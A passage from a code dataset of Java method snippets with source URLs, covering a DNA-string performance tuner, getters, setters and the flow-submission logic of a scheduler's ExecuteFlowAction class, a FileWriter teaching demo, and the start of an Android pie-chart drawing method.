measurements;\n\t\tdouble[][] matrix;\n\t\tString path;\n\t\tIntArray string=null;\n\t\tBernoulliSubstring w;\n\t\tSubstringIterator iterator;\n\t\tnThreads=Integer.parseInt(args[0]);\n\t\tBufferedWriter bw = new BufferedWriter(new FileWriter(new File(\"TUNE_EVERYTHING_OUT_\"+nThreads+\".txt\")));\n\t\tSimpleDateFormat sdf = new java.text.SimpleDateFormat(\"MM/dd/yyyy HH:mm:ss\");\n\n\t\t// Parsing input\n\t\tpath=\"dna.50MB\";  // (file,length,nLines): (dna.50MB,52427710,?), (NC_021658.fna,14782125,211174)\n\t\tstringLength=52427710;\n\t\titerations=1;\n\t\tbw.write(\"availableProcessors=\"+Runtime.getRuntime().availableProcessors()+\" (but using \"+nThreads+\")\\n\");\n\t\tbw.flush();\n\n\t\t// Building $SubstringIterator$\n\t\tint[] alphabet = new int[] {0,1,2,3};\n\t\ttry { string=Utils.loadDNA(path,stringLength,1000); }\n\t\tcatch(IOException e) {\n\t\t\te.printStackTrace();\n\t\t\tSystem.exit(1);\n\t\t}\n\t\tw = new BernoulliSubstring(4,Utils.log2(4),Utils.bitsToEncode(4),string.length()+1,Utils.log2(string.length()+1),Utils.bitsToEncode(string.length()+1));\n\t\ttime=System.currentTimeMillis();\n\t\titerator = new SubstringIterator(string,alphabet,alphabet.length,w);\n\t\tbw.write(\"construction time: \"+(System.currentTimeMillis()-time)+\"\\n\");\n\t\tbw.flush();\n\t\tConstants.N_THREADS=nThreads;\n\n/*\n\t\t// LONGS_PER_REGION\n\t\tEND=10;\n\t\tmeasurements = new double[END+1];\n\t\tfor (l=0; l<=END; l++) {\n\t\t\tConstants.LONGS_PER_REGION=1<<l;\n\t\t\ttime=System.currentTimeMillis();\n\t\t\tfor (int i=0; i<iterations; i++) iterator.run();\n\t\t\tmeasurements[l]=(double)(System.currentTimeMillis()-time)/iterations;\n\t\t\tbw.write(\".\");bw.flush();\n\t\t}\n\t\tbw.write(\"\\nLONGS_PER_REGION\\n\");\n\t\tmin=Double.MAX_VALUE;\n\t\tminIndex=-1;\n\t\tfor (l=0; l<=END; l++) {\n\t\t\tbw.write(measurements[l]+\"\\n\");\n\t\t\tif (measurements[l]<min) {\n\t\t\t\tmin=measurements[l];\n\t\t\t\tminIndex=l;\n\t\t\t}\n\t\t}\n\t\tbw.flush();\n\t\tConstants.LONGS_PER_REGION=1<<minIndex;\n\n\n\t\t// LONGS_PER_REGION_CHARACTERSTACK\n\t\tEND=10;\n\t\tmeasurements = new double[END+1];\n\t\tfor (l=0; l<=END; l++) {\n\t\t\tConstants.LONGS_PER_REGION_CHARACTERSTACK=1<<l;\n\t\t\ttime=System.currentTimeMillis();\n\t\t\tfor (int i=0; i<iterations; i++) iterator.run();\n\t\t\tmeasurements[l]=(double)(System.currentTimeMillis()-time)/iterations;\n\t\t\tbw.write(\".\");bw.flush();\n\t\t}\n\t\tbw.write(\"\\nLONGS_PER_REGION_CHARACTERSTACK\\n\");\n\t\tmin=Double.MAX_VALUE;\n\t\tminIndex=-1;\n\t\tfor (l=0; l<=END; l++) {\n\t\t\tbw.write(measurements[l]+\"\\n\");\n\t\t\tif (measurements[l]<min) {\n\t\t\t\tmin=measurements[l];\n\t\t\t\tminIndex=l;\n\t\t\t}\n\t\t}\n\t\tbw.flush();\n\t\tConstants.LONGS_PER_REGION_CHARACTERSTACK=1<<minIndex;\n\n\n\t\t// LONGS_PER_REGION_POINTERSTACK\n\t\tEND=10;\n\t\tmeasurements = new double[END+1];\n\t\tfor (l=0; l<=END; l++) {\n\t\t\tConstants.LONGS_PER_REGION_POINTERSTACK=1<<l;\n\t\t\ttime=System.currentTimeMillis();\n\t\t\tfor (int i=0; i<iterations; i++) iterator.run();\n\t\t\tmeasurements[l]=(double)(System.currentTimeMillis()-time)/iterations;\n\t\t\tbw.write(\".\");bw.flush();\n\t\t}\n\t\tbw.write(\"\\nLONGS_PER_REGION_POINTERSTACK\\n\");\n\t\tmin=Double.MAX_VALUE;\n\t\tminIndex=-1;\n\t\tfor (l=0; l<=END; l++) {\n\t\t\tbw.write(measurements[l]+\"\\n\");\n\t\t\tif (measurements[l]<min) {\n\t\t\t\tmin=measurements[l];\n\t\t\t\tminIndex=l;\n\t\t\t}\n\t\t}\n\t\tbw.flush();\n\t\tConstants.LONGS_PER_REGION_POINTERSTACK=1<<minIndex;\n\n\n\t\t// N_STEALING_ATTEMPTS\n\t\tEND1 = 10;\n\t\tSTEP2 = 10;\n\t\tEND2 = 100;\n\t\tmeasurements = new double[1+END1+(END2-END1)/STEP2];\n\t\tfor (l=1; l<=END1; l++) {\n\t\t\tConstants.N_STEALING_ATTEMPTS=l;\n\t\t\ttime=System.currentTimeMillis();\n\t\t\tfor (int i=0; i<iterations; i++) iterator.run();\n\t\t\tmeasurements[l]=(double)(System.currentTimeMillis()-time)/iterations;\n\t\t\tbw.write(\".\");bw.flush();\n\t\t}\n\t\tfor (l=END1+1; l<measurements.length; l++) {\n\t\t\tConstants.N_STEALING_ATTEMPTS=END1+(l-END1)*STEP2;\n\t\t\ttime=System.currentTimeMillis();\n\t\t\tfor (int i=0; i<iterations; i++) iterator.run();\n\t\t\tmeasurements[l]=(double)(System.currentTimeMillis()-time)/iterations;\n\t\t\tbw.write(\".\");bw.flush();\n\t\t}\n\t\tbw.write(\"\\nN_STEALING_ATTEMPTS\\n\");\n\t\tmin=Double.MAX_VALUE;\n\t\tminIndex=-1;\n\t\tfor (l=1; l<measurements.length; l++) {\n\t\t\tbw.write(measurements[l]+\"\\n\");\n\t\t\tif (measurements[l]<min) {\n\t\t\t\tmin=measurements[l];\n\t\t\t\tminIndex=l;\n\t\t\t}\n\t\t}\n\t\tbw.flush();\n\t\tConstants.N_STEALING_ATTEMPTS=minIndex<=END1?minIndex:END1+(minIndex-END1)*STEP2;\n*/\n\n\t\t// MAX_STRING_LENGTH_FOR_SPLIT, DONOR_STACK_LOWERBOUND\n\t\tEND1=10;\n\t\tEND2=10;\n\t\tmatrix = new double[END1+1][END2+1];\n\t\tbw.write(\"\\nMAX_STRING_LENGTH_FOR_SPLIT, DONOR_STACK_LOWERBOUND\\n\");\n\t\tfor (int m=END1; m>=1; m--) {\n\t\t\tConstants.MAX_STRING_LENGTH_FOR_SPLIT=m;\n\t\t\tfor (int d=END2; d>=2; d--) {\n\t\t\t\tConstants.DONOR_STACK_LOWERBOUND=d;\n\t\t\t\ttime=System.currentTimeMillis();\n\t\t\t\tfor (int i=0; i<iterations; i++) iterator.run();\n\t\t\t\tmatrix[m][d]=(double)(System.currentTimeMillis()-time)/iterations;\n\t\t\t\tbw.write(matrix[m][d]+\" \"); bw.flush();\n\t\t\t\tSystem.out.println(sdf.format(new java.util.Date())+\"> finished processing pair (\"+m+\",\"+d+\")\");\n\t\t\t}\n\t\t\tbw.write(\"\\n\"); bw.flush();\n\t\t}\n\t\tmin=Double.MAX_VALUE;\n\t\tint minIndex1 = -1;\n\t\tint minIndex2 = -1;\n\t\tfor (int m=1; m<=END1; m++) {\n\t\t\tfor (int d=2; d<=END2; d++) {\n\t\t\t\tif (matrix[m][d]<min) {\n\t\t\t\t\tmin=matrix[m][d];\n\t\t\t\t\tminIndex1=m;\n\t\t\t\t\tminIndex2=d;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tConstants.MAX_STRING_LENGTH_FOR_SPLIT=minIndex1;\n\t\tConstants.DONOR_STACK_LOWERBOUND=minIndex2;\n\n\n\n\t\tbw.close();\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/TuneEverything.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33513, "method_name": "setLogger", "class_name": "ExecuteFlowAction", "params": ["Logger"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void setLogger(final Logger logger) {\n    ExecuteFlowAction.logger = logger;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33514, "method_name": "getExecutorManager", "class_name": "ExecuteFlowAction", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "ExecutorManagerAdapter", "snippet": "  public static ExecutorManagerAdapter getExecutorManager() {\n    return executorManagerAdapter;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33515, "method_name": "setExecutorManager", "class_name": "ExecuteFlowAction", "params": ["ExecutorManagerAdapter"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void setExecutorManager(\n      final ExecutorManagerAdapter executorManagerAdapter) {\n    ExecuteFlowAction.executorManagerAdapter = executorManagerAdapter;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33516, "method_name": "getTriggerManager", "class_name": "ExecuteFlowAction", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "TriggerManager", "snippet": "  public static TriggerManager getTriggerManager() {\n    return triggerManager;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33517, "method_name": "setTriggerManager", "class_name": "ExecuteFlowAction", "params": ["TriggerManager"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void setTriggerManager(final TriggerManager triggerManager) {\n    ExecuteFlowAction.triggerManager = triggerManager;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33518, "method_name": "getSystemManager", "class_name": "ExecuteFlowAction", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "SystemManager", "snippet": "  public static SystemManager getSystemManager() {\n    return systemManager;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33519, "method_name": "setSystemManager", "class_name": "ExecuteFlowAction", "params": ["SystemManager"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void setSystemManager(SystemManager systemManager) {\n    ExecuteFlowAction.systemManager = systemManager;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33520, "method_name": "getProjectManager", "class_name": "ExecuteFlowAction", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "ProjectManager", "snippet": "  public static ProjectManager getProjectManager() {\n    return projectManager;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33521, "method_name": "setProjectManager", "class_name": "ExecuteFlowAction", "params": ["ProjectManager"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void setProjectManager(final ProjectManager projectManager) {\n    ExecuteFlowAction.projectManager = projectManager;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33522, "method_name": "createFromJson", "class_name": "ExecuteFlowAction", "params": ["HashMap<String,Object>"], "throws": null, "modifiers": ["public", "static"], "return_type": "TriggerAction", "snippet": "  public static TriggerAction createFromJson(final HashMap<String, Object> obj) {\n    final Map<String, Object> jsonObj = (HashMap<String, Object>) obj;\n    final String objType = (String) jsonObj.get(\"type\");\n    if (!objType.equals(type)) {\n      throw new RuntimeException(\"Cannot create action of \" + type + \" from \"\n          + objType);\n    }\n    final String actionId = (String) jsonObj.get(\"actionId\");\n    final int projectId = Integer.valueOf((String) jsonObj.get(\"projectId\"));\n    final String projectName = (String) jsonObj.get(\"projectName\");\n    final String flowName = (String) jsonObj.get(\"flowName\");\n    final String submitUser = (String) jsonObj.get(\"submitUser\");\n    ExecutionOptions executionOptions = null;\n    if (jsonObj.containsKey(\"executionOptions\")) {\n      executionOptions = ExecutionOptions.createFromObject(jsonObj.get(\"executionOptions\"));\n    }\n    List<SlaOption> slaOptions = null;\n    if (jsonObj.containsKey(\"slaOptions\")) {\n      slaOptions = new ArrayList<>();\n      final List<Object> slaOptionsObj = (List<Object>) jsonObj.get(\"slaOptions\");\n      for (final Object slaObj : slaOptionsObj) {\n        slaOptions.add(SlaOption.fromObject(slaObj));\n      }\n    }\n    //\u8bbe\u7f6e\u5176\u4ed6\u6570\u636e\u53c2\u6570\n    Map<String, Object> otherOptionsMap = new HashMap<>();\n    if(jsonObj.containsKey(\"otherOptions\")){\n      otherOptionsMap = (Map<String, Object>) jsonObj.get(\"otherOptions\");\n    }\n    return new ExecuteFlowAction(actionId, projectId, projectName, flowName,\n        submitUser, executionOptions, slaOptions, otherOptionsMap);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33523, "method_name": "getProjectName", "class_name": "ExecuteFlowAction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getProjectName() {\n    return this.projectName;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33524, "method_name": "getProjectId", "class_name": "ExecuteFlowAction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getProjectId() {\n    return this.projectId;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33525, "method_name": "setProjectId", "class_name": "ExecuteFlowAction", "params": ["int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void setProjectId(final int projectId) {\n    this.projectId = projectId;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33526, "method_name": "getFlowName", "class_name": "ExecuteFlowAction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getFlowName() {\n    return this.flowName;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33527, "method_name": "setFlowName", "class_name": "ExecuteFlowAction", "params": ["String"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void setFlowName(final String flowName) {\n    this.flowName = flowName;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33528, "method_name": "getSubmitUser", "class_name": "ExecuteFlowAction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getSubmitUser() {\n    return this.submitUser;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33529, "method_name": "setSubmitUser", "class_name": "ExecuteFlowAction", "params": ["String"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void setSubmitUser(final String submitUser) {\n    this.submitUser = submitUser;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33530, "method_name": "getExecutionOptions", "class_name": "ExecuteFlowAction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ExecutionOptions", "snippet": "  public ExecutionOptions getExecutionOptions() {\n    return this.executionOptions;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33531, "method_name": "setExecutionOptions", "class_name": "ExecuteFlowAction", "params": ["ExecutionOptions"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void setExecutionOptions(final ExecutionOptions executionOptions) {\n    this.executionOptions = executionOptions;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33532, "method_name": "getSlaOptions", "class_name": "ExecuteFlowAction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<SlaOption>", "snippet": "  public List<SlaOption> getSlaOptions() {\n    return this.slaOptions;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33533, "method_name": "setSlaOptions", "class_name": "ExecuteFlowAction", "params": ["List<SlaOption>"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void setSlaOptions(final List<SlaOption> slaOptions) {\n    this.slaOptions = slaOptions;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33534, "method_name": "getOtherOption", "class_name": "ExecuteFlowAction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "  public Map<String, Object> getOtherOption() {\n    return otherOption;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33535, "method_name": "setOtherOption", "class_name": "ExecuteFlowAction", "params": ["Map<String,Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setOtherOption(Map<String, Object> otherOption) {\n    this.otherOption = otherOption;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33536, "method_name": "getType", "class_name": "ExecuteFlowAction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getType() {\n    return type;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33537, "method_name": "fromJson", "class_name": "ExecuteFlowAction", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "TriggerAction", "snippet": "  public TriggerAction fromJson(final Object obj) {\n    return createFromJson((HashMap<String, Object>) obj);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33538, "method_name": "toJson", "class_name": "ExecuteFlowAction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object toJson() {\n    final Map<String, Object> jsonObj = new HashMap<>();\n    jsonObj.put(\"actionId\", this.actionId);\n    jsonObj.put(\"type\", type);\n    jsonObj.put(\"projectId\", String.valueOf(this.projectId));\n    jsonObj.put(\"projectName\", this.projectName);\n    jsonObj.put(\"flowName\", this.flowName);\n    jsonObj.put(\"submitUser\", this.submitUser);\n    if (this.executionOptions != null) {\n      jsonObj.put(\"executionOptions\", this.executionOptions.toObject());\n    }\n    if (this.slaOptions != null) {\n      final List<Object> slaOptionsObj = new ArrayList<>();\n      for (final SlaOption sla : this.slaOptions) {\n        slaOptionsObj.add(sla.toObject());\n      }\n      jsonObj.put(\"slaOptions\", slaOptionsObj);\n    }\n\n    if(this.otherOption != null){\n      jsonObj.put(\"otherOptions\", this.otherOption);\n    }\n\n    return jsonObj;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33539, "method_name": "doAction", "class_name": "ExecuteFlowAction", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void doAction() throws Exception {\n    if (projectManager == null || executorManagerAdapter == null) {\n      throw new Exception(\"ExecuteFlowAction not properly initialized!\");\n    }\n\n    final Project project = FlowUtils.getProject(projectManager, this.projectId);\n    final Flow flow = FlowUtils.getFlow(project, this.flowName);\n\n    final ExecutableFlow exflow = FlowUtils.createExecutableFlow(project, flow);\n\n    exflow.setSubmitUser(this.submitUser);\n\t\n\t// FIXME\u00a0Add proxy users to submit users to solve the problem that proxy users of scheduled tasks do not take effect.\n    exflow.addAllProxyUsers(project.getProxyUsers());\n    WtssUser wtssUser = null;\n    try {\n      wtssUser = systemManager.getSystemUserByUserName(this.submitUser);\n    } catch (SystemUserManagerException e){\n      logger.error(\"get wtssUser failed, \" + e);\n    }\n    if(wtssUser != null && wtssUser.getProxyUsers() != null) {\n      String[] proxySplit = wtssUser.getProxyUsers().split(\"\\\\s*,\\\\s*\");\n      logger.info(\"add proxyUser.\");\n      exflow.addAllProxyUsers(Arrays.asList(proxySplit));\n    }\n\n    if (this.executionOptions == null) {\n      this.executionOptions = new ExecutionOptions();\n    }\n    if (!this.executionOptions.isFailureEmailsOverridden()) {\n      this.executionOptions.setFailureEmails(flow.getFailureEmails());\n    }\n    if (!this.executionOptions.isSuccessEmailsOverridden()) {\n      this.executionOptions.setSuccessEmails(flow.getSuccessEmails());\n    }\n    exflow.setExecutionOptions(this.executionOptions);\n\n    if (this.slaOptions != null && this.slaOptions.size() > 0) {\n      exflow.setSlaOptions(this.slaOptions);\n    }\n    // FIXME\u00a0Set the task to a scheduled task type.\n    exflow.setFlowType(3);\n    // FIXME\u00a0Added new parameters for job stream, used to rerun job stream failure, and skip all tasks that failed execution.\n    if(null != this.otherOption && this.otherOption.size() > 0){\n      // \u8bbe\u7f6e\u4e86flow\u7684\u5931\u8d25\u91cd\u8dd1\n      if(this.otherOption.get(\"flowFailedRetryOption\") != null){\n        exflow.setFlowFailedRetry((Map<String, String>)this.otherOption.get(\"flowFailedRetryOption\"));\n      }\n      //\u662f\u5426\u8df3\u8fc7\u6240\u6709\u5931\u8d25job\n      exflow.setFailedSkipedAllJobs((Boolean) this.otherOption.getOrDefault(\"flowFailedSkiped\", false));\n      exflow.setOtherOption(this.otherOption);\n    }\n\n    logger.info(\"Invoking flow \" + project.getName() + \".\" + this.flowName);\n    executorManagerAdapter.submitExecutableFlow(exflow, this.submitUser);\n    logger.info(\"Invoked flow \" + project.getName() + \".\" + this.flowName);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33540, "method_name": "getDescription", "class_name": "ExecuteFlowAction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getDescription() {\n    return \"Execute flow \" + getFlowName() + \" from project \"\n        + getProjectName();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33541, "method_name": "setContext", "class_name": "ExecuteFlowAction", "params": ["Map<String,Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setContext(final Map<String, Object> context) {\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33542, "method_name": "getId", "class_name": "ExecuteFlowAction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getId() {\n    return this.actionId;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/builtin/ExecuteFlowAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33543, "method_name": "main", "class_name": "Demo01Writer", "params": ["String"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) throws IOException {\n        //1.\u521b\u5efaFileWriter\u5bf9\u8c61,\u6784\u9020\u65b9\u6cd5\u4e2d\u7ed1\u5b9a\u8981\u5199\u5165\u6570\u636e\u7684\u76ee\u7684\u5730\n        FileWriter fw = new FileWriter(\"09_IOAndProperties\\\\d.txt\");\n        //2.\u4f7f\u7528FileWriter\u4e2d\u7684\u65b9\u6cd5write,\u628a\u6570\u636e\u5199\u5165\u5230\u5185\u5b58\u7f13\u51b2\u533a\u4e2d(\u5b57\u7b26\u8f6c\u6362\u4e3a\u5b57\u8282\u7684\u8fc7\u7a0b)\n        //void write(int c) \u5199\u5165\u5355\u4e2a\u5b57\u7b26\u3002\n        fw.write(97);\n        //3.\u4f7f\u7528FileWriter\u4e2d\u7684\u65b9\u6cd5flush,\u628a\u5185\u5b58\u7f13\u51b2\u533a\u4e2d\u7684\u6570\u636e,\u5237\u65b0\u5230\u6587\u4ef6\u4e2d\n        //fw.flush();\n        //4.\u91ca\u653e\u8d44\u6e90(\u4f1a\u5148\u628a\u5185\u5b58\u7f13\u51b2\u533a\u4e2d\u7684\u6570\u636e\u5237\u65b0\u5230\u6587\u4ef6\u4e2d)\n        fw.close();\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/16.%E3%80%90%E5%BC%82%E5%B8%B8%E3%80%81%E7%BA%BF%E7%A8%8B%E3%80%91-%E7%AC%94%E8%AE%B0/20.%E3%80%90%E5%AD%97%E8%8A%82%E6%B5%81%E3%80%81%E5%AD%97%E7%AC%A6%E6%B5%81%E3%80%91-%E7%AC%94%E8%AE%B0/code/09_IOAndProperties/src/com/itheima/Demo05Writer/Demo01Writer.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33544, "method_name": "onDraw", "class_name": "Practice11PieChartView", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {\n        super.onDraw(canvas);\n\n        int marginBottom = 40;\n        int marginPhone = 200;\n\n        // \u7ed8\u5236\u6807\u9898\n        String title = \"2019\u4e0a\u534a\u5e74\u5b89\u5353\u624b\u673a\u5e02\u573a\u5360\u6bd4\";\n        mPaint.setTextAlign(Paint.Align.CENTER);\n        mPaint.setTextSize(48);\n        mPaint.setColor(Color.BLACK);\n        canvas.drawText(title, getWidth() / 2, getHeight() - marginBottom, mPaint);\n\n        // \u6247\u5f62\u7ed8\u5236\u8d77\u70b9\n        int outset = -188;\n\n        // \u5bf9\u6bd4 360 \u5ea6\u8f6c\u6362\u500d\u7387\n        double to360 = 3.43;\n\n        // \u624b\u673a\u5360\u6bd4\n        double percent;\n\n        // \u6247\u5f62\u5f00\u59cb\u89d2\u5ea6\u3001\u5212\u8fc7\u4e00\u534a\u89d2\u5ea6\n        float startAngle = 0, midAngle;\n\n        // \u6298\u7ebf\u4e24\u6bb5\u7ebf\n        int line1 = 25, line2;\n\n        // 